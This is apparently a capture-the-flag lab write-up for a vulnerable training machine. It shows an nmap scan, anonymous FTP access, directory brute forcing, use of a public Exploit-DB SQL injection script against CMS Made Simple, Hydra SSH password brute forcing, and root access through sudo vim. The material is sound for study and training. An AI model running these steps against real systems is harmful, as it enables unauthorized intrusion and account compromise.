> Author: jak010  
> Dat:2021.05.22

## Scan
- Command
	```
	nmap -sC -sV {EXPORT_IP}
	```
	- Result
		```
		Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 12:08 EDT
		Nmap scan report for 10.10.170.151
		Host is up (0.27s latency).
		Not shown: 997 filtered ports
		PORT     STATE SERVICE VERSION
		21/tcp   open  ftp     vsftpd 3.0.3
		| ftp-anon: Anonymous FTP login allowed (FTP code 230)
		|_Can't get directory listing: TIMEOUT
		| ftp-syst: 
		|   STAT: 
		| FTP server status:
		|      Connected to ::ffff:10.9.26.67
		|      Logged in as ftp
		|      TYPE: ASCII
		|      No session bandwidth limit
		|      Session timeout in seconds is 300
		|      Control connection is plain text
		|      Data connections will be plain text
		|      At session startup, client count was 3
		|      vsFTPd 3.0.3 - secure, fast, stable
		|_End of status
		80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
		| http-robots.txt: 2 disallowed entries 
		|_/ /openemr-5_0_1_3 
		|_http-server-header: Apache/2.4.18 (Ubuntu)
		|_http-title: Apache2 Ubuntu Default Page: It works
		2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
		| ssh-hostkey: 
		|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
		|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
		|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
		Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 61.33 seconds
		```

## Enumeration
- `Ftp`
	- Allow Anonmous Login && Access
		```
		ftp> cd pub
		250 Directory successfully changed.
		ftp> ls
		200 PORT command successful. Consider using PASV.
		150 Here comes the directory listing.
		-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
		```
	- ForMitch.txt
		```text
		Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
		```
- `Web`
	- Driectory Brute Forcing
		```
		===============================================================
		Gobuster v3.1.0
		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
		===============================================================
		[+] Url:                     http://10.10.170.151/
		[+] Method:                  GET
		[+] Threads:                 12
		[+] Wordlist:                raft-large-directories-lowercase.txt
		[+] Negative Status codes:   404
		[+] User Agent:              gobuster/3.1.0
		[+] Timeout:                 10s
		===============================================================
		2021/05/21 12:14:43 Starting gobuster in directory enumeration mode
		===============================================================
		/simple               (Status: 301) [Size: 315] [--> http://10.10.170.151/simple/]
		/server-status        (Status: 403) [Size: 301]       
		```

## Exploit 
- Module Search
	- `google` at `simple cms 2.2.8 exploit`
	- `exploit-db.com`
		- `https://www.exploit-db.com/exploits/46635`

- Module Usage
	```sh
	$ python2 46635.py -u http://{EXPORT_IP}/simple -w 
	``` 
	- Result
		```
		[+] Salt for password found: 17RL1p.H
		[+] Username found: mitch17e
		[+] Email found: admitF4to73
		[+] Password found: 0ajUD
		```

## Retry Credential Ganing
- Ftp File: "ForMitch.txt" <==> username: mitch16e ---> `username is: "mitch"` (maybe...)
- Password Brute Forcing with Hydra

## Password Brute Forcing
- Command
	```
	$ hydra -l mitch -P rockyou.txt EXPORT_IP ssh -s 2222
	```
	- Result
		```
		...
		Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-21 12:53:08
		[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
		[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
		[DATA] attacking ssh://10.10.170.151:2222/
		[2222][ssh] host: 10.10.170.151   login: mitch   password: secret
		...
		Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-21 12:53:21
		```

## Gaining Access
- Command
	```
	$ ssh -p 2222 mitch@EXPORT_IP
	```
	- Credential -> mitch:secret

## Privilege Escalate
- Command
	```sh
	$ sudo -l
	User mitch may run the following commands on Machine:
	    (root) NOPASSWD: /usr/bin/vim
	...
	$ sudo /usr/bin/vim
	:!/bin/sh
	```